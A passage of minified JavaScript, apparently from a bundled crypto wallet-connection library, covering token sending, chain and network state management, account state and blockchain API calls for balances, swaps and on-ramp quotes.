this.filterLowQualityTokens(i)}const n=await Ie.getBalance(e,r.caipNetworkId,t);return this.filterLowQualityTokens(n.balances)},async getEIP155Balances(t,e){var r,n,i;try{const s=Lw.getChainIdHexFromCAIP2ChainId(e.caipNetworkId);if(!((i=(n=(r=await we.getCapabilities(t))==null?void 0:r[s])==null?void 0:n.assetDiscovery)!=null&&i.supported))return null;const o=await we.walletGetAssets({account:t,chainFilter:[s]});return Lw.isWalletGetAssetsResponse(o)?(o[s]||[]).map(a=>Lw.createBalance(a,e.caipNetworkId)):null}catch{return null}},filterLowQualityTokens(t){return t.filter(e=>e.quantity.decimals!=="0")},mapBalancesToSwapTokens(t){return(t==null?void 0:t.map(e=>({...e,address:e!=null&&e.address?e.address:B.getActiveNetworkTokenAddress(),decimals:parseInt(e.quantity.decimals,10),logoUri:e.iconUrl,eip2612:!1})))||[]}},je=ht({tokenBalances:[],loading:!1}),$4={state:je,subscribe(t){return yr(je,()=>t(je))},subscribeKey(t,e){return Tr(je,t,e)},setToken(t){t&&(je.token=Cc(t))},setTokenAmount(t){je.sendTokenAmount=t},setReceiverAddress(t){je.receiverAddress=t},setReceiverProfileImageUrl(t){je.receiverProfileImageUrl=t},setReceiverProfileName(t){je.receiverProfileName=t},setGasPrice(t){je.gasPrice=t},setGasPriceInUsd(t){je.gasPriceInUSD=t},setNetworkBalanceInUsd(t){je.networkBalanceInUSD=t},setLoading(t){je.loading=t},sendToken(){var t;switch((t=B.state.activeCaipNetwork)==null?void 0:t.chainNamespace){case"eip155":this.sendEvmToken();return;case"solana":this.sendSolanaToken();return;default:throw new Error("Unsupported chain")}},sendEvmToken(){var r,n,i,s,o,a;const t=B.state.activeChain,e=(r=me.state.preferredAccountTypes)==null?void 0:r[t];(n=this.state.token)!=null&&n.address&&this.state.sendTokenAmount&&this.state.receiverAddress?(De.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:e===uo.ACCOUNT_TYPES.SMART_ACCOUNT,token:this.state.token.address,amount:this.state.sendTokenAmount,network:((i=B.state.activeCaipNetwork)==null?void 0:i.caipNetworkId)||""}}),this.sendERC20Token({receiverAddress:this.state.receiverAddress,tokenAddress:this.state.token.address,sendTokenAmount:this.state.sendTokenAmount,decimals:this.state.token.quantity.decimals})):this.state.receiverAddress&&this.state.sendTokenAmount&&this.state.gasPrice&&((s=this.state.token)!=null&&s.quantity.decimals)&&(De.sendEvent({type:"track",event:"SEND_INITIATED",properties:{isSmartAccount:e===uo.ACCOUNT_TYPES.SMART_ACCOUNT,token:(o=this.state.token)==null?void 0:o.symbol,amount:this.state.sendTokenAmount,network:((a=B.state.activeCaipNetwork)==null?void 0:a.caipNetworkId)||""}}),this.sendNativeToken({receiverAddress:this.state.receiverAddress,sendTokenAmount:this.state.sendTokenAmount,gasPrice:this.state.gasPrice,decimals:this.state.token.quantity.decimals}))},async fetchTokenBalance(t){var s,o;je.loading=!0;const e=(s=B.state.activeCaipNetwork)==null?void 0:s.caipNetworkId,r=(o=B.state.activeCaipNetwork)==null?void 0:o.chainNamespace,n=B.state.activeCaipAddress,i=n?te.getPlainAddress(n):void 0;if(je.lastRetry&&!te.isAllowedRetry(je.lastRetry,30*Ut.ONE_SEC_MS))return je.loading=!1,[];try{if(i&&e&&r){const a=await T4.getMyTokensWithBalance();return je.tokenBalances=a,je.lastRetry=void 0,a}}catch(a){je.lastRetry=Date.now(),t==null||t(a),ut.showError("Token Balance Unavailable")}finally{je.loading=!1}return[]},fetchNetworkBalance(){if(je.tokenBalances.length===0)return;const t=T4.mapBalancesToSwapTokens(je.tokenBalances);if(!t)return;const e=t.find(r=>r.address===B.getActiveNetworkTokenAddress());e&&(je.networkBalanceInUSD=e?Op.multiply(e.quantity.numeric,e.price).toString():"0")},isInsufficientNetworkTokenForGas(t,e){const r=e||"0";return Op.bigNumber(t).eq(0)?!0:Op.bigNumber(Op.bigNumber(r)).gt(t)},hasInsufficientGasFunds(){var r;const t=B.state.activeChain;let e=!0;return((r=me.state.preferredAccountTypes)==null?void 0:r[t])===uo.ACCOUNT_TYPES.SMART_ACCOUNT?e=!1:je.networkBalanceInUSD&&(e=this.isInsufficientNetworkTokenForGas(je.networkBalanceInUSD,je.gasPriceInUSD)),e},async sendNativeToken(t){var o,a,c,l,u,h;const e=B.state.activeChain;se.pushTransactionStack({view:"Account",goBack:!1});const r=t.receiverAddress,n=me.state.address,i=we.parseUnits(t.sendTokenAmount.toString(),Number(t.decimals)),s="0x";try{await we.sendTransaction({chainNamespace:"eip155",to:r,address:n,data:s,value:i??BigInt(0),gasPrice:t.gasPrice}),ut.showSuccess("Transaction started"),De.sendEvent({type:"track",event:"SEND_SUCCESS",properties:{isSmartAccount:((o=me.state.preferredAccountTypes)==null?void 0:o[e])===uo.ACCOUNT_TYPES.SMART_ACCOUNT,token:((a=this.state.token)==null?void 0:a.symbol)||"",amount:t.sendTokenAmount,network:((c=B.state.activeCaipNetwork)==null?void 0:c.caipNetworkId)||""}}),this.resetSend()}catch(d){console.error("SendController:sendERC20Token - failed to send native token",d);const f=d instanceof Error?d.message:"Unknown error";De.sendEvent({type:"track",event:"SEND_ERROR",properties:{message:f,isSmartAccount:((l=me.state.preferredAccountTypes)==null?void 0:l[e])===uo.ACCOUNT_TYPES.SMART_ACCOUNT,token:((u=this.state.token)==null?void 0:u.symbol)||"",amount:t.sendTokenAmount,network:((h=B.state.activeCaipNetwork)==null?void 0:h.caipNetworkId)||""}}),ut.showError("Something went wrong")}},async sendERC20Token(t){var r,n,i;se.pushTransactionStack({view:"Account",goBack:!1});const e=we.parseUnits(t.sendTokenAmount.toString(),Number(t.decimals));try{if(me.state.address&&t.sendTokenAmount&&t.receiverAddress&&t.tokenAddress){const s=te.getPlainAddress(t.tokenAddress);await we.writeContract({fromAddress:me.state.address,tokenAddress:s,args:[t.receiverAddress,e??BigInt(0)],method:"transfer",abi:dj.getERC20Abi(s),chainNamespace:"eip155"}),ut.showSuccess("Transaction started"),this.resetSend()}}catch(s){console.error("SendController:sendERC20Token - failed to send erc20 token",s);const o=s instanceof Error?s.message:"Unknown error";De.sendEvent({type:"track",event:"SEND_ERROR",properties:{message:o,isSmartAccount:((r=me.state.preferredAccountTypes)==null?void 0:r.eip155)===uo.ACCOUNT_TYPES.SMART_ACCOUNT,token:((n=this.state.token)==null?void 0:n.symbol)||"",amount:t.sendTokenAmount,network:((i=B.state.activeCaipNetwork)==null?void 0:i.caipNetworkId)||""}}),ut.showError("Something went wrong")}},sendSolanaToken(){if(!this.state.sendTokenAmount||!this.state.receiverAddress){ut.showError("Please enter a valid amount and receiver address");return}se.pushTransactionStack({view:"Account",goBack:!1}),we.sendTransaction({chainNamespace:"solana",to:this.state.receiverAddress,value:this.state.sendTokenAmount}).then(()=>{this.resetSend(),me.fetchTokenBalance()}).catch(t=>{ut.showError("Failed to send transaction. Please try again."),console.error("SendController:sendToken - failed to send solana transaction",t)})},resetSend(){je.token=void 0,je.sendTokenAmount=void 0,je.receiverAddress=void 0,je.receiverProfileImageUrl=void 0,je.receiverProfileName=void 0,je.loading=!1,je.tokenBalances=[]}},Uw={currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,allAccounts:[],user:void 0},Up={caipNetwork:void 0,supportsAllNetworks:!0,smartAccountEnabledNetworks:[]},ie=ht({chains:yj(),activeCaipAddress:void 0,activeChain:void 0,activeCaipNetwork:void 0,noAdapters:!1,universalAdapter:{networkControllerClient:void 0,connectionControllerClient:void 0},isSwitchingNamespace:!1}),B={state:ie,subscribe(t){return yr(ie,()=>{t(ie)})},subscribeKey(t,e){return Tr(ie,t,e)},subscribeChainProp(t,e,r){let n;return yr(ie.chains,()=>{var s;const i=r||ie.activeChain;if(i){const o=(s=ie.chains.get(i))==null?void 0:s[t];n!==o&&(n=o,e(o))}})},initialize(t,e,r){const{chainId:n,namespace:i}=pe.getActiveNetworkProps(),s=e==null?void 0:e.find(c=>c.id.toString()===(n==null?void 0:n.toString())),o=t.find(c=>(c==null?void 0:c.namespace)===i)||(t==null?void 0:t[0]),a=new Set([...(e==null?void 0:e.map(c=>c.chainNamespace))??[]]);((t==null?void 0:t.length)===0||!o)&&(ie.noAdapters=!0),ie.noAdapters||(ie.activeChain=o==null?void 0:o.namespace,ie.activeCaipNetwork=s,this.setChainNetworkData(o==null?void 0:o.namespace,{caipNetwork:s}),ie.activeChain&&Us.set({activeChain:o==null?void 0:o.namespace})),a.forEach(c=>{const l=e==null?void 0:e.filter(u=>u.chainNamespace===c);B.state.chains.set(c,{namespace:c,networkState:ht({...Up,caipNetwork:l==null?void 0:l[0]}),accountState:ht(Uw),caipNetworks:l??[],...r}),this.setRequestedCaipNetworks(l??[],c)})},removeAdapter(t){var e,r;if(ie.activeChain===t){const n=Array.from(ie.chains.entries()).find(([i])=>i!==t);if(n){const i=(r=(e=n[1])==null?void 0:e.caipNetworks)==null?void 0:r[0];i&&this.setActiveCaipNetwork(i)}}ie.chains.delete(t)},addAdapter(t,{networkControllerClient:e,connectionControllerClient:r},n){ie.chains.set(t.namespace,{namespace:t.namespace,networkState:{...Up,caipNetwork:n[0]},accountState:Uw,caipNetworks:n,connectionControllerClient:r,networkControllerClient:e}),this.setRequestedCaipNetworks((n==null?void 0:n.filter(i=>i.chainNamespace===t.namespace))??[],t.namespace)},addNetwork(t){var r;const e=ie.chains.get(t.chainNamespace);if(e){const n=[...e.caipNetworks||[]];(r=e.caipNetworks)!=null&&r.find(i=>i.id===t.id)||n.push(t),ie.chains.set(t.chainNamespace,{...e,caipNetworks:n}),this.setRequestedCaipNetworks(n,t.chainNamespace)}},removeNetwork(t,e){var n,i,s;const r=ie.chains.get(t);if(r){const o=((n=ie.activeCaipNetwork)==null?void 0:n.id)===e,a=[...((i=r.caipNetworks)==null?void 0:i.filter(c=>c.id!==e))||[]];o&&((s=r==null?void 0:r.caipNetworks)!=null&&s[0])&&this.setActiveCaipNetwork(r.caipNetworks[0]),ie.chains.set(t,{...r,caipNetworks:a}),this.setRequestedCaipNetworks(a||[],t)}},setAdapterNetworkState(t,e){const r=ie.chains.get(t);r&&(r.networkState={...r.networkState||Up,...e},ie.chains.set(t,r))},setChainAccountData(t,e,r=!0){if(!t)throw new Error("Chain is required to update chain account data");const n=ie.chains.get(t);if(n){const i={...n.accountState||Uw,...e};ie.chains.set(t,{...n,accountState:i}),(ie.chains.size===1||ie.activeChain===t)&&(e.caipAddress&&(ie.activeCaipAddress=e.caipAddress),me.replaceState(i))}},setChainNetworkData(t,e){if(!t)return;const r=ie.chains.get(t);if(r){const n={...r.networkState||Up,...e};ie.chains.set(t,{...r,networkState:n})}},setAccountProp(t,e,r,n=!0){this.setChainAccountData(r,{[t]:e},n),t==="status"&&e==="disconnected"&&r&&ae.removeConnectorId(r)},setActiveNamespace(t){var n,i;ie.activeChain=t;const e=t?ie.chains.get(t):void 0,r=(n=e==null?void 0:e.networkState)==null?void 0:n.caipNetwork;r!=null&&r.id&&t&&(ie.activeCaipAddress=(i=e==null?void 0:e.accountState)==null?void 0:i.caipAddress,ie.activeCaipNetwork=r,this.setChainNetworkData(t,{caipNetwork:r}),pe.setActiveCaipNetworkId(r==null?void 0:r.caipNetworkId),Us.set({activeChain:t,selectedNetworkId:r==null?void 0:r.caipNetworkId}))},setActiveCaipNetwork(t){var r,n,i;if(!t)return;ie.activeChain!==t.chainNamespace&&this.setIsSwitchingNamespace(!0);const e=ie.chains.get(t.chainNamespace);ie.activeChain=t.chainNamespace,ie.activeCaipNetwork=t,this.setChainNetworkData(t.chainNamespace,{caipNetwork:t}),(r=e==null?void 0:e.accountState)!=null&&r.address?ie.activeCaipAddress=`${t.chainNamespace}:${t.id}:${(n=e==null?void 0:e.accountState)==null?void 0:n.address}`:ie.activeCaipAddress=void 0,this.setAccountProp("caipAddress",ie.activeCaipAddress,t.chainNamespace),e&&me.replaceState(e.accountState),$4.resetSend(),Us.set({activeChain:ie.activeChain,selectedNetworkId:(i=ie.activeCaipNetwork)==null?void 0:i.caipNetworkId}),pe.setActiveCaipNetworkId(t.caipNetworkId),!this.checkIfSupportedNetwork(t.chainNamespace)&&Y.state.enableNetworkSwitch&&!Y.state.allowUnsupportedChain&&!we.state.wcBasic&&this.showUnsupportedChainUI()},addCaipNetwork(t){var r;if(!t)return;const e=ie.chains.get(t.chainNamespace);e&&((r=e==null?void 0:e.caipNetworks)==null||r.push(t))},async switchActiveNamespace(t){var i;if(!t)return;const e=t!==B.state.activeChain,r=(i=B.getNetworkData(t))==null?void 0:i.caipNetwork,n=B.getCaipNetworkByNamespace(t,r==null?void 0:r.id);e&&n&&await B.switchActiveNetwork(n)},async switchActiveNetwork(t){var r,n;!((n=(r=B.state.chains.get(B.state.activeChain))==null?void 0:r.caipNetworks)!=null&&n.some(i=>{var s;return i.id===((s=ie.activeCaipNetwork)==null?void 0:s.id)}))&&se.goBack();const e=this.getNetworkControllerClient(t.chainNamespace);e&&(await e.switchCaipNetwork(t),De.sendEvent({type:"track",event:"SWITCH_NETWORK",properties:{network:t.caipNetworkId}}))},getNetworkControllerClient(t){const e=t||ie.activeChain,r=ie.chains.get(e);if(!r)throw new Error("Chain adapter not found");if(!r.networkControllerClient)throw new Error("NetworkController client not set");return r.networkControllerClient},getConnectionControllerClient(t){const e=t||ie.activeChain;if(!e)throw new Error("Chain is required to get connection controller client");const r=ie.chains.get(e);if(!(r!=null&&r.connectionControllerClient))throw new Error("ConnectionController client not set");return r.connectionControllerClient},getAccountProp(t,e){var i;let r=ie.activeChain;if(e&&(r=e),!r)return;const n=(i=ie.chains.get(r))==null?void 0:i.accountState;if(n)return n[t]},getNetworkProp(t,e){var n;const r=(n=ie.chains.get(e))==null?void 0:n.networkState;if(r)return r[t]},getRequestedCaipNetworks(t){const e=ie.chains.get(t),{approvedCaipNetworkIds:r=[],requestedCaipNetworks:n=[]}=(e==null?void 0:e.networkState)||{};return te.sortRequestedNetworks(r,n)},getAllRequestedCaipNetworks(){const t=[];return ie.chains.forEach(e=>{const r=this.getRequestedCaipNetworks(e.namespace);t.push(...r)}),t},setRequestedCaipNetworks(t,e){this.setAdapterNetworkState(e,{requestedCaipNetworks:t})},getAllApprovedCaipNetworkIds(){const t=[];return ie.chains.forEach(e=>{const r=this.getApprovedCaipNetworkIds(e.namespace);t.push(...r)}),t},getActiveCaipNetwork(){return ie.activeCaipNetwork},getActiveCaipAddress(){return ie.activeCaipAddress},getApprovedCaipNetworkIds(t){var e,r;return((r=(e=ie.chains.get(t))==null?void 0:e.networkState)==null?void 0:r.approvedCaipNetworkIds)||[]},async setApprovedCaipNetworksData(t){var r;const e=await((r=this.getNetworkControllerClient())==null?void 0:r.getApprovedCaipNetworksData());this.setAdapterNetworkState(t,{approvedCaipNetworkIds:e==null?void 0:e.approvedCaipNetworkIds,supportsAllNetworks:e==null?void 0:e.supportsAllNetworks})},checkIfSupportedNetwork(t,e){const r=e||ie.activeCaipNetwork,n=this.getRequestedCaipNetworks(t);return n.length?n==null?void 0:n.some(i=>i.id===(r==null?void 0:r.id)):!0},checkIfSupportedChainId(t){var e;return ie.activeChain?(e=this.getRequestedCaipNetworks(ie.activeChain))==null?void 0:e.some(r=>r.id===t):!0},setSmartAccountEnabledNetworks(t,e){this.setAdapterNetworkState(e,{smartAccountEnabledNetworks:t})},checkIfSmartAccountEnabled(){var r,n;const t=yA.caipNetworkIdToNumber((r=ie.activeCaipNetwork)==null?void 0:r.caipNetworkId),e=ie.activeChain;return!e||!t?!1:!!((n=this.getNetworkProp("smartAccountEnabledNetworks",e))!=null&&n.includes(Number(t)))},getActiveNetworkTokenAddress(){var n,i;const t=((n=ie.activeCaipNetwork)==null?void 0:n.chainNamespace)||"eip155",e=((i=ie.activeCaipNetwork)==null?void 0:i.id)||1,r=Ut.NATIVE_TOKEN_ADDRESS[t];return`${t}:${e}:${r}`},showUnsupportedChainUI(){qe.open({view:"UnsupportedChain"})},checkIfNamesSupported(){const t=ie.activeCaipNetwork;return!!(t!=null&&t.chainNamespace&&Ut.NAMES_SUPPORTED_CHAIN_NAMESPACES.includes(t.chainNamespace))},resetNetwork(t){this.setAdapterNetworkState(t,{approvedCaipNetworkIds:void 0,supportsAllNetworks:!0,smartAccountEnabledNetworks:[]})},resetAccount(t){const e=t;if(!e)throw new Error("Chain is required to set account prop");ie.activeCaipAddress=void 0,this.setChainAccountData(e,{smartAccountDeployed:!1,currentTab:0,caipAddress:void 0,address:void 0,balance:void 0,balanceSymbol:void 0,profileName:void 0,profileImage:void 0,addressExplorerUrl:void 0,tokenBalance:[],connectedWalletInfo:void 0,preferredAccountTypes:void 0,socialProvider:void 0,socialWindow:void 0,farcasterUrl:void 0,allAccounts:[],user:void 0,status:"disconnected"}),ae.removeConnectorId(e)},async disconnect(t){const e=Oj(t);try{$4.resetSend();const r=await Promise.allSettled(e.map(async([i,s])=>{var o;try{const{caipAddress:a}=this.getAccountData(i)||{};a&&((o=s.connectionControllerClient)!=null&&o.disconnect)&&await s.connectionControllerClient.disconnect(i),this.resetAccount(i),this.resetNetwork(i)}catch(a){throw new Error(`Failed to disconnect chain ${i}: ${a.message}`)}}));we.resetWcConnection();const n=r.filter(i=>i.status==="rejected");if(n.length>0)throw new Error(n.map(i=>i.reason.message).join(", "));pe.deleteConnectedSocialProvider(),t?ae.removeConnectorId(t):ae.resetConnectorIds(),De.sendEvent({type:"track",event:"DISCONNECT_SUCCESS",properties:{namespace:t||"all"}})}catch(r){console.error(r.message||"Failed to disconnect chains"),De.sendEvent({type:"track",event:"DISCONNECT_ERROR",properties:{message:r.message||"Failed to disconnect chains"}})}},setIsSwitchingNamespace(t){ie.isSwitchingNamespace=t},getFirstCaipNetworkSupportsAuthConnector(){var r,n;const t=[];let e;if(ie.chains.forEach(i=>{ve.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(s=>s===i.namespace)&&i.namespace&&t.push(i.namespace)}),t.length>0){const i=t[0];return e=i?(n=(r=ie.chains.get(i))==null?void 0:r.caipNetworks)==null?void 0:n[0]:void 0,e}},getAccountData(t){var e;return t?(e=B.state.chains.get(t))==null?void 0:e.accountState:me.state},getNetworkData(t){var r;const e=t||ie.activeChain;if(e)return(r=B.state.chains.get(e))==null?void 0:r.networkState},getCaipNetworkByNamespace(t,e){var i,s,o;if(!t)return;const r=B.state.chains.get(t);return((i=r==null?void 0:r.caipNetworks)==null?void 0:i.find(a=>a.id===e))||((s=r==null?void 0:r.networkState)==null?void 0:s.caipNetwork)||((o=r==null?void 0:r.caipNetworks)==null?void 0:o[0])},getRequestedCaipNetworkIds(){const t=ae.state.filterByNamespace;return(t?[ie.chains.get(t)]:Array.from(ie.chains.values())).flatMap(e=>(e==null?void 0:e.caipNetworks)||[]).map(e=>e.caipNetworkId)},getCaipNetworks(t){return t?B.getRequestedCaipNetworks(t):B.getAllRequestedCaipNetworks()}},MV={purchaseCurrencies:[{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},{id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"Ether",symbol:"ETH",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]}],paymentCurrencies:[{id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},{id:"EUR",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]}]},g9=te.getBlockchainApiUrl(),tn=ht({clientId:null,api:new n1({baseUrl:g9,clientId:null}),supportedChains:{http:[],ws:[]}}),Ie={state:tn,async get(t){const{st:e,sv:r}=Ie.getSdkProperties(),n=Y.state.projectId,i={...t.params||{},st:e,sv:r,projectId:n};return tn.api.get({...t,params:i})},getSdkProperties(){const{sdkType:t,sdkVersion:e}=Y.state;return{st:t||"unknown",sv:e||"unknown"}},async isNetworkSupported(t){if(!t)return!1;try{tn.supportedChains.http.length||await Ie.getSupportedNetworks()}catch{return!1}return tn.supportedChains.http.includes(t)},async getSupportedNetworks(){const t=await Ie.get({path:"v1/supported-chains"});return tn.supportedChains=t,t},async fetchIdentity({address:t,caipNetworkId:e}){if(!await Ie.isNetworkSupported(e))return{avatar:"",name:""};const r=pe.getIdentityFromCacheForAddress(t);if(r)return r;const n=await Ie.get({path:`/v1/identity/${t}`,params:{sender:B.state.activeCaipAddress?te.getPlainAddress(B.state.activeCaipAddress):void 0}});return pe.updateIdentityCache({address:t,identity:n,timestamp:Date.now()}),n},async fetchTransactions({account:t,cursor:e,onramp:r,signal:n,cache:i,chainId:s}){var o;return await Ie.isNetworkSupported((o=B.state.activeCaipNetwork)==null?void 0:o.caipNetworkId)?Ie.get({path:`/v1/account/${t}/history`,params:{cursor:e,onramp:r,chainId:s},signal:n,cache:i}):{data:[],next:void 0}},async fetchSwapQuote({amount:t,userAddress:e,from:r,to:n,gasPrice:i}){var s;return await Ie.isNetworkSupported((s=B.state.activeCaipNetwork)==null?void 0:s.caipNetworkId)?Ie.get({path:"/v1/convert/quotes",headers:{"Content-Type":"application/json"},params:{amount:t,userAddress:e,from:r,to:n,gasPrice:i}}):{quotes:[]}},async fetchSwapTokens({chainId:t}){var e;return await Ie.isNetworkSupported((e=B.state.activeCaipNetwork)==null?void 0:e.caipNetworkId)?Ie.get({path:"/v1/convert/tokens",params:{chainId:t}}):{tokens:[]}},async fetchTokenPrice({addresses:t}){var e;return await Ie.isNetworkSupported((e=B.state.activeCaipNetwork)==null?void 0:e.caipNetworkId)?tn.api.post({path:"/v1/fungible/price",body:{currency:"usd",addresses:t,projectId:Y.state.projectId},headers:{"Content-Type":"application/json"}}):{fungibles:[]}},async fetchSwapAllowance({tokenAddress:t,userAddress:e}){var r;return await Ie.isNetworkSupported((r=B.state.activeCaipNetwork)==null?void 0:r.caipNetworkId)?Ie.get({path:"/v1/convert/allowance",params:{tokenAddress:t,userAddress:e},headers:{"Content-Type":"application/json"}}):{allowance:"0"}},async fetchGasPrice({chainId:t}){var n;const{st:e,sv:r}=Ie.getSdkProperties();if(!await Ie.isNetworkSupported((n=B.state.activeCaipNetwork)==null?void 0:n.caipNetworkId))throw new Error("Network not supported for Gas Price");return Ie.get({path:"/v1/convert/gas-price",headers:{"Content-Type":"application/json"},params:{chainId:t,st:e,sv:r}})},async generateSwapCalldata({amount:t,from:e,to:r,userAddress:n,disableEstimate:i}){var s;if(!await Ie.isNetworkSupported((s=B.state.activeCaipNetwork)==null?void 0:s.caipNetworkId))throw new Error("Network not supported for Swaps");return tn.api.post({path:"/v1/convert/build-transaction",headers:{"Content-Type":"application/json"},body:{amount:t,eip155:{slippage:Ut.CONVERT_SLIPPAGE_TOLERANCE},projectId:Y.state.projectId,from:e,to:r,userAddress:n,disableEstimate:i}})},async generateApproveCalldata({from:t,to:e,userAddress:r}){var s;const{st:n,sv:i}=Ie.getSdkProperties();if(!await Ie.isNetworkSupported((s=B.state.activeCaipNetwork)==null?void 0:s.caipNetworkId))throw new Error("Network not supported for Swaps");return Ie.get({path:"/v1/convert/build-approve",headers:{"Content-Type":"application/json"},params:{userAddress:r,from:t,to:e,st:n,sv:i}})},async getBalance(t,e,r){var c;const{st:n,sv:i}=Ie.getSdkProperties();if(!await Ie.isNetworkSupported((c=B.state.activeCaipNetwork)==null?void 0:c.caipNetworkId))return ut.showError("Token Balance Unavailable"),{balances:[]};const s=`${e}:${t}`,o=pe.getBalanceCacheForCaipAddress(s);if(o)return o;const a=await Ie.get({path:`/v1/account/${t}/balance`,params:{currency:"usd",chainId:e,forceUpdate:r,st:n,sv:i}});return pe.updateBalanceCache({caipAddress:s,balance:a,timestamp:Date.now()}),a},async lookupEnsName(t){var e;return await Ie.isNetworkSupported((e=B.state.activeCaipNetwork)==null?void 0:e.caipNetworkId)?Ie.get({path:`/v1/profile/account/${t}`,params:{apiVersion:"2"}}):{addresses:{},attributes:[]}},async reverseLookupEnsName({address:t}){var e;return await Ie.isNetworkSupported((e=B.state.activeCaipNetwork)==null?void 0:e.caipNetworkId)?Ie.get({path:`/v1/profile/reverse/${t}`,params:{sender:me.state.address,apiVersion:"2"}}):[]},async getEnsNameSuggestions(t){var e;return await Ie.isNetworkSupported((e=B.state.activeCaipNetwork)==null?void 0:e.caipNetworkId)?Ie.get({path:`/v1/profile/suggestions/${t}`,params:{zone:"reown.id"}}):{suggestions:[]}},async registerEnsName({coinType:t,address:e,message:r,signature:n}){var i;return await Ie.isNetworkSupported((i=B.state.activeCaipNetwork)==null?void 0:i.caipNetworkId)?tn.api.post({path:"/v1/profile/account",body:{coin_type:t,address:e,message:r,signature:n},headers:{"Content-Type":"application/json"}}):{success:!1}},async generateOnRampURL({destinationWallets:t,partnerUserId:e,defaultNetwork:r,purchaseAmount:n,paymentAmount:i}){var s;return await Ie.isNetworkSupported((s=B.state.activeCaipNetwork)==null?void 0:s.caipNetworkId)?(await tn.api.post({path:"/v1/generators/onrampurl",params:{projectId:Y.state.projectId},body:{destinationWallets:t,defaultNetwork:r,partnerUserId:e,defaultExperience:"buy",presetCryptoAmount:n,presetFiatAmount:i}})).url:""},async getOnrampOptions(){var t;if(!await Ie.isNetworkSupported((t=B.state.activeCaipNetwork)==null?void 0:t.caipNetworkId))return{paymentCurrencies:[],purchaseCurrencies:[]};try{return await Ie.get({path:"/v1/onramp/options"})}catch{return MV}},async getOnrampQuote({purchaseCurrency:t,paymentCurrency:e,amount:r,network:n}){var i;try{return await Ie.isNetworkSupported((i=B.state.activeCaipNetwork)==null?void 0:i.caipNetworkId)?await tn.api.post({path:"/v1/onramp/quote",params:{projectId:Y.state.projectId},body:{purchaseCurrency:t,paymentCurrency:e,amount:r,network:n}}):null}catch{return{coinbaseFee:{amount:r,currency:e.id},networkFee:{amount:r,currency:e.id},paymentSubtotal:{amount:r,currency:e.id},paymentTotal:{amount:r,currency:e.id},purchaseAmount:{amount:r,currency:e.id},quoteId:"mocked-quote-id"}}},async getSmartSessions(t){var e;return await Ie.isNetworkSupported((e=B.state.activeCaipNetwork)==null?void 0:e.caipNetworkId)?Ie.get({path:`/v1/sessions/${t}`}):[]},async revokeSmartSession(t,e,r){var n;return await Ie.isNetworkSupported((n=B.state.activeCaipNetwork)==null?void 0:n.caipNetworkId)?tn.api.post({path:`/v1/sessions/${t}/revoke`,params:{projectId:Y.state.projectId},body:{pci:e,signature:r}}):{success:!1}},setClientId(t){tn.clientId=t,tn.api=new n1({baseUrl:g9,clientId:t})}},xn=ht({currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,allAccounts:[]}),me={state:xn,replaceState(t){t&&Object.assign(xn,Cc(t))},subscribe(t){return B.subscribeChainProp("accountState",e=>{if(e)return t(e)})},subscribeKey(t,e,r){let n;return B.subscribeChainProp("accountState",i=>{if(i){const s=i[t];n!==s&&(n=s,e(s))}},r)},setStatus(t,e){B.setAccountProp("status",t,e)},getCaipAddress(t){return B.getAccountProp("caipAddress",t)},setCaipAddress(t,e){const r=t?te.getPlainAddress(t):void 0;e===B.state.activeChain&&(B.state.activeCaipAddress=t),B.setAccountProp("caipAddress",t,e),B.setAccountProp("address",r,e)},setBalance(t,e,r){B.setAccountProp("balance",t,r),B.setAccountProp("balanceSymbol",e,r)},setProfileName(t,e){B.setAccountProp("profileName",t,e)},setProfileImage(t,e){B.setAccountProp("profileImage",t,e)},setUser(t,e){B.setAccountProp("user",t,e)},setAddressExplorerUrl(t,e){B.setAccountProp("addressExplorerUrl",t,e)},setSmartAccountDeployed(t,e){B.setAccountProp("smartAccountDeployed",t,e)},setCurrentTab(t){B.setAccountProp("currentTab",t,B.state.activeChain)},setTokenBalance(t,e){t&&B.setAccountProp("tokenBalance",t,e)},setShouldUpdateToAddress(t,e){B.setAccountProp("shouldUpdateToAddress",t,e)},setAllAccounts(t,e){B.setAccountProp("allAccounts",t,e)},addAddressLabel(t,e,r){const n=B.getAccountProp("addressLabels",r)||new Map;n.set(t,e),B.setAccountProp("addressLabels",n,r)},removeAddressLabel(t,e){const r=B.getAccountProp("addressLabels",e)||new Map;r.delete(t),B.setAccountProp("addressLabels",r,e)},setConnectedWalletInfo(t,e){B.setAccountProp("connectedWalletInfo",t,e,!1)},setPreferredAccountType(t,e){B.setAccountProp("preferredAccountTypes",{...xn.preferredAccountTypes,[e]:t},e)},setPreferredAccountTypes(t){xn.preferredAccountTypes=t},setSocialProvider(t,e){t&&B.setAccountProp("socialProvider",t,e)},setSocialWindow(t,e){B.setAccountProp("socialWindow",t?Cc(t):void 0,e)},setFarcasterUrl(t,e){B.setAccountProp("farcasterUrl",t,e)},async fetchTokenBalance(t){var s,o;xn.balanceLoading=!0;const e=(s=B.state.activeCaipNetwork)==null?void 0:s.caipNetworkId,r=(o=B.state.activeCaipNetwork)==null?void 0:o.chainNamespace,n=B.state.activeCaipAddress,i=n?te.getPlainAddress(n):void 0;if(xn.lastRetry&&!te.isAllowedRetry(xn.lastRetry,30*Ut.ONE_SEC_MS))return xn.balanceLoading=!1,[];try{if(i&&e&&r){const a=(await Ie.getBalance(i,e)).balances.filter(c=>c.quantity.decimals!=="0");return this.setTokenBalance(a,r),xn.lastRetry=void 